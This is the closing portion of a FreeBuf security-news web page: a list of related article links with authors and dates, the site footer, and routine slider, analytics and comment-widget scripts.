                                <p>                                        <span class="name"><a href="http://www.freebuf.com/author/360%e5%ae%89%e5%85%a8%e5%8d%ab%e5%a3%ab" title="由 360安全卫士 发布" rel="author">360安全卫士</a></span>
                                                                        <span class="time">2015-04-27</span></p>
                            </li>
                                                    <li><a href="http://www.freebuf.com/news/70598.html" rel="bookmark"
                                   title="黑客大神凯文·米特尼克再出山：教你如何攻击光纤网络并窃取敏感数据">黑客大神凯文·米特尼克再出山：教你如何攻击光纤网络并窃取敏感数据</a>
                                <p>                                        <span class="name"><a href="http://www.freebuf.com/author/jackfree" title="由 JackFree 发布" rel="author">JackFree</a></span>
                                                                        <span class="time">2015-06-23</span></p>
                            </li>
                                                    <li><a href="http://www.freebuf.com/articles/web/36683.html" rel="bookmark"
                                   title="见招拆招：绕过WAF继续SQL注入常用方法">见招拆招：绕过WAF继续SQL注入常用方法</a>
                                <p>                                        <span class="name"><a href="http://www.freebuf.com/author/mikey" title="由 mikey 发布" rel="author">mikey</a></span>
                                                                        <span class="time">2014-06-17</span></p>
                            </li>
                                                    <li><a href="http://www.freebuf.com/news/topnews/56951.html" rel="bookmark"
                                   title="专访：24岁大学生白帽子Ben的成长史">专访：24岁大学生白帽子Ben的成长史</a>
                                <p>                                        <span class="name"><a href="http://www.freebuf.com/author/%e6%bc%8f%e6%b4%9e%e7%9b%92%e5%ad%90" title="由 漏洞盒子 发布" rel="author">漏洞盒子</a></span>
                                                                        <span class="time">2015-01-22</span></p>
                            </li>
                                                            </ul>
            </div>
            </div>
</div>
<script type="text/javascript">
  $(window).load(function() {
    $('#slider').nivoSlider();
  });
  $('#contenttxt img').removeAttr('height');
  $('#contenttxt img').wrap(function(){
    if(!$(this).parent().attr('href')){
      var imgurl = $(this).attr('data-original');
      if(imgurl.substr(-6)=='!small'){
        imgurl = imgurl.substring(0,imgurl.length-6);
      }
      return '<a href="' + imgurl + '" class="highslide-image" onclick="return hs.expand(this);" target="_blank"></a>';
    }
  })
</script>
<script src="http://www.freebuf.com/buf/themes/freebuf/js/comments-ajax.js" type="text/javascript"></script>
<script type="text/javascript" src="http://static.3001.net/js/focus/jquery.nivo.slider.pack.js"></script>
<!----------footer---------->
<div class="footer">
  <div class="container">
    <div class="footer-list ">
      <h3>FREEBUF</h3>
      <ul>
        <li><a href="http://www.freebuf.com/dis">免责声明</a></li>
        <li><a href="http://www.freebuf.com/news/others/864.html">关于我们</a></li>
        <li><a href="http://www.freebuf.com/jobs/40386.html">加入我们</a></li>
      </ul>
    </div>
    <div class="footer-list ">
      <h3>广告及服务</h3>
      <ul>
        <li><a target="_blank" href="mailto:root@freebuf.com">寻求报道</a></li>
        <li><a href="http://www.freebuf.com/advertise">广告合作</a></li>
        <li><a target="_blank" href="mailto:help@freebuf.com">联系我们</a></li>
        <li><a href="http://www.freebuf.com/friends">友情链接</a></li>
      </ul>
    </div>
    <div class="footer-list ">
      <h3>关注我们</h3>
      <ul>
        <li><div class="weixin-pannel weixin"><a class="qr" href="javascript:viod(0);"><span class="g-icon-qr1">官方微信</span><i></i></a></div></li>
        <li><a rel="nofollow" target="_blank" href="http://weibo.com/freebuf">新浪微博</a></li>
        <li><a rel="nofollow" target="_blank" href="http://t.qq.com/freebuf">腾讯微博</a></li>
        <li><a rel="nofollow" target="_blank" href="http://twitter.com/freebuf">Twitter</a></li>
      </ul>
    </div>
    <div class="footer-list ">
      <h3>赞助商</h3>
      <ul>
        <li style="padding:6px 0 10px;"><a rel="nofollow" target="_blank" href="http://www.aliyun.com/?freebuf"><img src="http://image.3001.net/images/ad/ali.png"></a></li>
        <li><a rel="nofollow" target="_blank" href="http://www.upyun.com/?freebuf"><img src="http://image.3001.net/images/ad/upyun.png"></a></li>
        <li style="padding:6px 0 10px;"><a rel="nofollow" target="_blank" href="https://www.trustasia.com/?freebuf"><img src="http://image.3001.net/images/ad/ad-yzcx.png"></a></li>
      </ul>
    </div>
    <div class="footer-list ">
      <ul>
      </ul>
    </div>
    <div class="footer-logo  pull-right"><img src="http://image.3001.net/images/index/freebufrobot_shendanjie.png" ></div>
  </div>
  <div class="copyright"><div class="container"><p>Copyright &copy; 2017 WWW.FREEBUF.COM All Rights Reserved <a rel="nofollow" target="_blank" href="http://www.miitbeian.gov.cn">沪ICP备13033796号</a></p><span><a rel="nofollow" target="_blank" href="http://click.aliyun.com/m/1336/?freebuf"><img src="http://image.3001.net/images/new/icon-aly.png"></a></span></div></div>
</div>
<div class="bottom_tools"><a id="scrollUp" href="javascript:;" title="飞回顶部"></a></div>
<!----------footer end----------> 
<script src="http://static.3001.net/js/new/backtop.js"></script>
<script type="text/javascript">
jQuery(function(){	
	jQuery('.tabPanes ul li').click(function(){
		jQuery(this).addClass('hit').siblings().removeClass('hit');
		jQuery('.panesl>div:eq('+jQuery(this).index()+')').show().siblings().hide();	
	})
	jQuery('.vulbox-nav').click(function(e) { 
        e.stopPropagation(); 
    });  
})
</script>
<script type="text/javascript">
var _bdhmProtocol = (("https:" == document.location.protocol) ? " https://" : " http://");
document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3Fcc53db168808048541c6735ce30421f5' type='text/javascript'%3E%3C/script%3E"));
</script>
<img alt='css.php' src="http://www.freebuf.com/buf/plugins/cc/css.php?k=3cb185a485c81b23211eb80b75a406fd&amp;o=i&amp;t=1046334418" width='1' height='1' /><script type="text/javascript">
jQuery(function() {
    jQuery(".simditor pre").each(function(i, block){
        hljs.highlightBlock(block);    
    });
    hljs.initHighlightingOnLoad();
});
</script>
<script>
/* <![CDATA[ */
var rcGlobal = {
	serverUrl		:'http://www.freebuf.com',
	infoTemp		:'%REVIEWER% on %POST%',
	loadingText		:'Loading',
	noCommentsText	:'No comments',
	newestText		:'&laquo; 最新',
	newerText		:'&laquo; 新一点',
	olderText		:'旧一点 &raquo;',
	showContent		:'1',
	external		:'1',
	avatarSize		:'32',
	avatarPosition	:'left',
	anonymous		:'Anonymous'
};
/* ]]> */
</script>
<script type='text/javascript' src='http://static.3001.net/js/recentcomments/wp-recentcomments-jquery.js?ver=2.2.3'></script>
</body>
</html>
